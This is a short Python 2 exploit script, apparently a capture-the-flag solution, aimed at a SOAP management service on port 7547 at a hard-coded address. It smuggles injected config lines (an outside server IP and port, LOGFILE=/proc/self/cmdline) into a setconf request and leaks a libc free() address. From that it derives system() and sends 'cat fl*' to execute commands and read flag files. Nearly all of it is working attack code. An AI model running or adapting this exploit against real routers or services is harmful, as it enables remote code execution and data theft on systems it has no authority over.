# Change SERVER and PORT to somethinf where sploit_server.py runs
d1 = """<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body xmlns:ns="urn:oam"><ns:getversion></ns:getversion></soap:Body></soap:Envelope>

<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body xmlns:ns="urn:oam"><ns:setconf><value xsi:type="xsd:string">aaaa
SERVER=93.115.90.171
PORT=12345
LOGFILE=/proc/self/cmdline</value></ns:setconf></soap:Body></soap:Envelope>

<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body xmlns:ns="urn:oam"><ns:reset></ns:reset></soap:Body></soap:Envelope>"""

d2 = """<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body xmlns:ns="urn:oam"><ns:echotest></ns:echotest></soap:Body></soap:Envelope>"""

import socket
import time
s = socket.socket()
s.connect(('54.178.148.88', 7547))
#s.connect(('127.0.0.1', 7547))
time.sleep(1)
#s.sendall("file oam\nr\n")
#time.sleep(1)
#print s.recv(2048)

s.sendall(d1)
import time
time.sleep(1)
print s.recv(2048)

s.sendall(d2)
time.sleep(1)

d3 = s.recv(2048)
free = d3[-8:]
import struct
free, = struct.unpack('<Q', free)
print hex(free)

#0000000000082df0 g    DF .text 00000000000000f5  GLIBC_2.2.5 free
#0000000000046640  w   DF .text  000000000000002d  GLIBC_2.2.5 system

#diff = 251200
diff = 0x82df0 - 0x46640

free2 = free - diff
print hex(free2)

s.sendall('cat fl*\x00') # max 8 bytes, change in READ call in sploit_server.py
time.sleep(1)
print s.recv(2048)
time.sleep(1)
s.sendall(struct.pack('<Q', free2))
time.sleep(1)
print s.recv(2048)
print s.recv(2048)
